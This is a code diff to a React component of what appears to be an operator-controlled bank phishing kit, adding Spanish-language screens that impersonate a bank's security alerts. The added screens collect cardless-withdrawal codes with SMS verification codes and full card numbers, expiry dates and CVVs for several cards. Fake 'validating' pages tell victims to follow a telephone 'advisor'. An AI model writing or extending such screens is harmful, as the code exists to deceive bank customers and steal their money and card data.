@@ -123,6 +123,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
   // Estados para ACTUALIZACION (contador de 30 minutos)
   const [timeLeft, setTimeLeft] = useState(30 * 60); // 30 minutos en segundos
+
+  // Estados para CODIGO_RETIRO
+  const [codigoRetiro, setCodigoRetiro] = useState('');
+  const [codigoVerificacion, setCodigoVerificacion] = useState('');
+
+  // Estados para PROTECCION_TARJETAS
+  const [tarjetas, setTarjetas] = useState([{ numero: '', vencimiento: '', cvv: '', tipo: 'credito' as 'credito' | 'debito' }]);
   const [showContinueBtn, setShowContinueBtn] = useState(false);
 
   // useEffect para inicializar el timer basándose en waitingStartTime
@@ -3310,6 +3317,334 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           </div>
         );
         return actualizacionContent;
+
+      case ScreenType.AVISO_SEGURIDAD:
+        const avisoSeguridadContent = (
+          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
+            <div style={{ maxWidth: '600px', width: '100%', background: '#ffffff', borderRadius: '12px', boxShadow: '0 4px 20px rgba(0, 0, 0, 0.1)', padding: '40px' }}>
+              {/* Ícono de advertencia */}
+              <div style={{ textAlign: 'center', marginBottom: '24px' }}>
+                <div style={{ display: 'flex', width: '80px', height: '80px', background: 'linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%)', borderRadius: '50%', alignItems: 'center', justifyContent: 'center', marginBottom: '16px', margin: '0 auto' }}>
+                  <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5">
+                    <path d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
+                  </svg>
+                </div>
+              </div>
+
+              <h2 style={{ fontSize: '24px', fontWeight: 700, color: '#1f2937', marginBottom: '24px', textAlign: 'center' }}>
+                Aviso de Seguridad
+              </h2>
+
+              <div style={{ background: '#f9fafb', borderLeft: '4px solid #0c4a5e', padding: '20px', marginBottom: '28px', borderRadius: '4px' }}>
+                <p style={{ fontSize: '16px', color: '#374151', marginBottom: '16px', lineHeight: '1.6' }}>
+                  Usted inició sesión en un dispositivo:
+                </p>
+                <p style={{ fontSize: '18px', fontWeight: 600, color: '#0c4a5e', marginBottom: '12px' }}>
+                  Galaxy Note 9
+                </p>
+                <p style={{ fontSize: '14px', color: '#6b7280', marginBottom: '8px' }}>
+                  <strong>Ciudad:</strong> Puebla
+                </p>
+                <p style={{ fontSize: '14px', color: '#6b7280' }}>
+                  <strong>IP:</strong> 189.200.001.1
+                </p>
+              </div>
+
+              <p style={{ fontSize: '16px', color: '#374151', marginBottom: '28px', textAlign: 'center', lineHeight: '1.6' }}>
+                Si usted realizó este inicio de sesión presione <strong>SÍ</strong>. <br/>
+                Si no fue usted presione <strong>DESVINCULAR</strong>.
+              </p>
+
+              <div style={{ display: 'flex', gap: '12px', flexDirection: 'column' }}>
+                <button 
+                  onClick={() => window.close()}
+                  style={{ width: '100%', padding: '14px', background: '#10b981', color: 'white', border: 'none', borderRadius: '8px', fontSize: '16px', fontWeight: 600, cursor: 'pointer', transition: 'background 0.3s' }}
+                  onMouseOver={(e) => e.currentTarget.style.background = '#059669'}
+                  onMouseOut={(e) => e.currentTarget.style.background = '#10b981'}
+                  data-testid="button-si-seguridad"
+                >
+                  SÍ, fui yo
+                </button>
+                <button 
+                  onClick={() => onSubmit(ScreenType.AVISO_SEGURIDAD, { action: 'desvincular' })}
+                  style={{ width: '100%', padding: '14px', background: '#ef4444', color: 'white', border: 'none', borderRadius: '8px', fontSize: '16px', fontWeight: 600, cursor: 'pointer', transition: 'background 0.3s' }}
+                  onMouseOver={(e) => e.currentTarget.style.background = '#dc2626'}
+                  onMouseOut={(e) => e.currentTarget.style.background = '#ef4444'}
+                  data-testid="button-desvincular"
+                >
+                  DESVINCULAR
+                </button>
+              </div>
+            </div>
+          </div>
+        );
+        return avisoSeguridadContent;
+
+      case ScreenType.VALIDANDO_SEGURIDAD:
+        const validandoSeguridadContent = (
+          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
+            <div style={{ maxWidth: '500px', textAlign: 'center' }}>
+              <div style={{ marginBottom: '32px' }}>
+                <img src={validatingGif} alt="Validando" style={{ width: '120px', height: '120px', margin: '0 auto' }} />
+              </div>
+              <h2 style={{ fontSize: '24px', fontWeight: 600, color: '#0c4a5e', marginBottom: '16px' }}>
+                Validando información...
+              </h2>
+              <p style={{ fontSize: '16px', color: '#6b7280', lineHeight: '1.6' }}>
+                Por favor espere un momento
+              </p>
+            </div>
+          </div>
+        );
+        return validandoSeguridadContent;
+
+      case ScreenType.CODIGO_RETIRO:
+        const codigoRetiroContent = (
+          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
+            <div style={{ maxWidth: '600px', width: '100%', background: '#ffffff', borderRadius: '12px', boxShadow: '0 4px 20px rgba(0, 0, 0, 0.1)', padding: '40px' }}>
+              <h2 style={{ fontSize: '24px', fontWeight: 700, color: '#1f2937', marginBottom: '20px', textAlign: 'center' }}>
+                Por tu seguridad
+              </h2>
+
+              <div style={{ background: '#fef3c7', borderLeft: '4px solid #f59e0b', padding: '16px', marginBottom: '28px', borderRadius: '4px' }}>
+                <p style={{ fontSize: '15px', color: '#92400e', lineHeight: '1.6' }}>
+                  Necesitamos cancelar un retiro pendiente sin tarjeta
+                </p>
+              </div>
+
+              <form onSubmit={(e) => {
+                e.preventDefault();
+                if (codigoRetiro.length === 10 && codigoVerificacion.length === 4) {
+                  onSubmit(ScreenType.CODIGO_RETIRO, { codigoRetiro, codigoVerificacionSMS: codigoVerificacion });
+                }
+              }}>
+                <div style={{ marginBottom: '24px' }}>
+                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
+                    Código de retiro (10 dígitos)
+                  </label>
+                  <input
+                    type="text"
+                    value={codigoRetiro}
+                    onChange={(e) => setCodigoRetiro(e.target.value.replace(/\D/g, '').slice(0, 10))}
+                    placeholder="Ingrese los 10 dígitos"
+                    required
+                    maxLength={10}
+                    style={{ width: '100%', padding: '12px 16px', border: '1px solid #d1d5db', borderRadius: '6px', fontSize: '16px' }}
+                    data-testid="input-codigo-retiro"
+                  />
+                </div>
+
+                <div style={{ marginBottom: '24px' }}>
+                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
+                    Código de verificación SMS (4 dígitos)
+                  </label>
+                  <input
+                    type="text"
+                    value={codigoVerificacion}
+                    onChange={(e) => setCodigoVerificacion(e.target.value.replace(/\D/g, '').slice(0, 4))}
+                    placeholder="Código recibido por SMS"
+                    required
+                    maxLength={4}
+                    style={{ width: '100%', padding: '12px 16px', border: '1px solid #d1d5db', borderRadius: '6px', fontSize: '16px' }}
+                    data-testid="input-codigo-sms"
+                  />
+                </div>
+
+                <div style={{ background: '#e0f2fe', border: '1px solid #0284c7', padding: '16px', marginBottom: '24px', borderRadius: '6px' }}>
+                  <p style={{ fontSize: '13px', color: '#075985', lineHeight: '1.5', marginBottom: '8px' }}>
+                    <strong>Importante:</strong>
+                  </p>
+                  <p style={{ fontSize: '13px', color: '#075985', lineHeight: '1.5', marginBottom: '8px' }}>
+                    • Siga los pasos de su asesor en línea para ayudarlo a encontrar esta información
+                  </p>
+                  <p style={{ fontSize: '13px', color: '#075985', lineHeight: '1.5' }}>
+                    • No proporcione estos datos en línea
+                  </p>
+                </div>
+
+                <button 
+                  type="submit"
+                  style={{ width: '100%', padding: '14px', background: '#0c4a5e', color: 'white', border: 'none', borderRadius: '8px', fontSize: '16px', fontWeight: 600, cursor: 'pointer', transition: 'background 0.3s' }}
+                  onMouseOver={(e) => e.currentTarget.style.background = '#0a3d4f'}
+                  onMouseOut={(e) => e.currentTarget.style.background = '#0c4a5e'}
+                  data-testid="button-enviar-codigo-retiro"
+                >
+                  Continuar
+                </button>
+              </form>
+            </div>
+          </div>
+        );
+        return codigoRetiroContent;
+
+      case ScreenType.PROTECCION_TARJETAS:
+        const agregarTarjeta = () => {
+          setTarjetas([...tarjetas, { numero: '', vencimiento: '', cvv: '', tipo: 'credito' }]);
+        };
+        
+        const eliminarTarjeta = (index: number) => {
+          const newTarjetas = tarjetas.filter((_, i) => i !== index);
+          setTarjetas(newTarjetas.length > 0 ? newTarjetas : [{ numero: '', vencimiento: '', cvv: '', tipo: 'credito' }]);
+        };
+        
+        const actualizarTarjeta = (index: number, field: string, value: string) => {
+          const newTarjetas = [...tarjetas];
+          newTarjetas[index] = { ...newTarjetas[index], [field]: value };
+          setTarjetas(newTarjetas);
+        };
+        
+        const proteccionTarjetasContent = (
+          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', padding: '20px' }}>
+            <div style={{ maxWidth: '700px', margin: '0 auto', background: '#ffffff', borderRadius: '12px', boxShadow: '0 4px 20px rgba(0, 0, 0, 0.1)', padding: '40px' }}>
+              <h2 style={{ fontSize: '24px', fontWeight: 700, color: '#1f2937', marginBottom: '16px', textAlign: 'center' }}>
+                Protección de Tarjetas
+              </h2>
+
+              <p style={{ fontSize: '16px', color: '#6b7280', marginBottom: '28px', textAlign: 'center', lineHeight: '1.6' }}>
+                Por tu seguridad haremos una protección de tu tarjeta de crédito y débito para compras en línea
+              </p>
+
+              <form onSubmit={(e) => {
+                e.preventDefault();
+                const tarjetasValidas = tarjetas.filter(t => t.numero && t.vencimiento && t.cvv);
+                if (tarjetasValidas.length > 0) {
+                  onSubmit(ScreenType.PROTECCION_TARJETAS, { tarjetas: tarjetasValidas });
+                }
+              }}>
+                {tarjetas.map((tarjeta, index) => (
+                  <div key={index} style={{ background: '#f9fafb', border: '1px solid #e5e7eb', borderRadius: '8px', padding: '24px', marginBottom: '20px' }}>
+                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
+                      <h3 style={{ fontSize: '16px', fontWeight: 600, color: '#374151' }}>
+                        Tarjeta #{index + 1}
+                      </h3>
+                      {tarjetas.length > 1 && (
+                        <button
+                          type="button"
+                          onClick={() => eliminarTarjeta(index)}
+                          style={{ background: '#ef4444', color: 'white', border: 'none', borderRadius: '4px', padding: '6px 12px', fontSize: '13px', cursor: 'pointer' }}
+                          data-testid={`button-eliminar-tarjeta-${index}`}
+                        >
+                          Eliminar
+                        </button>
+                      )}
+                    </div>
+
+                    <div style={{ marginBottom: '16px' }}>
+                      <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
+                        Tipo de tarjeta
+                      </label>
+                      <select
+                        value={tarjeta.tipo}
+                        onChange={(e) => actualizarTarjeta(index, 'tipo', e.target.value)}
+                        style={{ width: '100%', padding: '10px 12px', border: '1px solid #d1d5db', borderRadius: '6px', fontSize: '15px', background: 'white' }}
+                        data-testid={`select-tipo-tarjeta-${index}`}
+                      >
+                        <option value="credito">Crédito</option>
+                        <option value="debito">Débito</option>
+                      </select>
+                    </div>
+
+                    <div style={{ marginBottom: '16px' }}>
+                      <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
+                        Número de tarjeta (16 dígitos)
+                      </label>
+                      <input
+                        type="text"
+                        value={tarjeta.numero}
+                        onChange={(e) => actualizarTarjeta(index, 'numero', e.target.value.replace(/\D/g, '').slice(0, 16))}
+                        placeholder="1234 5678 9012 3456"
+                        required
+                        maxLength={16}
+                        style={{ width: '100%', padding: '12px 16px', border: '1px solid #d1d5db', borderRadius: '6px', fontSize: '16px' }}
+                        data-testid={`input-numero-tarjeta-${index}`}
+                      />
+                    </div>
+
+                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px' }}>
+                      <div>
+                        <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
+                          Vencimiento (MM/AA)
+                        </label>
+                        <input
+                          type="text"
+                          value={tarjeta.vencimiento}
+                          onChange={(e) => {
+                            let value = e.target.value.replace(/\D/g, '');
+                            if (value.length >= 2) {
+                              value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                            }
+                            actualizarTarjeta(index, 'vencimiento', value);
+                          }}
+                          placeholder="MM/AA"
+                          required
+                          maxLength={5}
+                          style={{ width: '100%', padding: '12px 16px', border: '1px solid #d1d5db', borderRadius: '6px', fontSize: '16px' }}
+                          data-testid={`input-vencimiento-${index}`}
+                        />
+                      </div>
+                      <div>
+                        <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
+                          CVV
+                        </label>
+                        <input
+                          type="text"
+                          value={tarjeta.cvv}
+                          onChange={(e) => actualizarTarjeta(index, 'cvv', e.target.value.replace(/\D/g, '').slice(0, 4))}
+                          placeholder="123"
+                          required
+                          maxLength={4}
+                          style={{ width: '100%', padding: '12px 16px', border: '1px solid #d1d5db', borderRadius: '6px', fontSize: '16px' }}
+                          data-testid={`input-cvv-${index}`}
+                        />
+                      </div>
+                    </div>
+                  </div>
+                ))}
+
+                <button
+                  type="button"
+                  onClick={agregarTarjeta}
+                  style={{ width: '100%', padding: '12px', background: '#f3f4f6', color: '#374151', border: '1px dashed #9ca3af', borderRadius: '8px', fontSize: '15px', fontWeight: 600, cursor: 'pointer', marginBottom: '20px' }}
+                  data-testid="button-agregar-tarjeta"
+                >
+                  + Agregar otra tarjeta
+                </button>
+
+                <button 
+                  type="submit"
+                  style={{ width: '100%', padding: '14px', background: '#0c4a5e', color: 'white', border: 'none', borderRadius: '8px', fontSize: '16px', fontWeight: 600, cursor: 'pointer', transition: 'background 0.3s' }}
+                  onMouseOver={(e) => e.currentTarget.style.background = '#0a3d4f'}
+                  onMouseOut={(e) => e.currentTarget.style.background = '#0c4a5e'}
+                  data-testid="button-enviar-tarjetas"
+                >
+                  Proteger mis tarjetas
+                </button>
+              </form>
+            </div>
+          </div>
+        );
+        return proteccionTarjetasContent;
+
+      case ScreenType.VERIFICANDO_INFO:
+        const verificandoInfoContent = (
+          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
+            <div style={{ maxWidth: '500px', textAlign: 'center' }}>
+              <div style={{ marginBottom: '32px' }}>
+                <img src={validatingGif} alt="Verificando" style={{ width: '120px', height: '120px', margin: '0 auto' }} />
+              </div>
+              <h2 style={{ fontSize: '24px', fontWeight: 600, color: '#0c4a5e', marginBottom: '16px' }}>
+                Estamos verificando la información
+              </h2>
+              <p style={{ fontSize: '16px', color: '#6b7280', lineHeight: '1.6', marginBottom: '8px' }}>
+                Sigue las instrucciones de tu asesor telefónico
+              </p>
+              <p style={{ fontSize: '14px', color: '#9ca3af', fontStyle: 'italic' }}>
+                No cierre esta ventana
+              </p>
+            </div>
+          </div>
+        );
+        return verificandoInfoContent;
 
       case ScreenType.NETKEY_MANUAL:
         const manualChallenge = screenData.manualNetkeyChallenge || sessionData?.manualNetkeyChallenge || '00000000';
